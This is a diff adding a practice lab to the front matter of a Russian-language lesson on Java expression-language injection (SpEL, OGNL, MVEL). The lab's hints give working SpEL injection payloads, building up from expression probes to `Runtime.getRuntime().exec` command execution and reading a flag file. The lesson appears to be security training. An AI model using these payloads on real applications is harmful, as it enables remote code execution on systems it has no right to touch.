@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "Инъекции в expression language Java: SpEL, OGNL, MVEL — от вычисления выражений до RCE (Spring4Shell, Struts2)."
+lab:
+  kind: shell
+  title: 'Практика: SpEL-инъекция в параметре'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Проверь, вычисляется ли выражение: `sort=#{7*7}` → `"sortedBy":"49"`.'
+    - 'Доступны ли классы: `T(java.lang.Math).random()` вернёт число.'
+    - 'RCE: `T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})` — но вывод нужно прочитать из `getInputStream()`.'
+    - 'Для лабы достаточно `exec(new String[]{"cat /flag"})` — ответ покажет значение.'
 ---
 
 ## Вопрос, с которого всё начинается
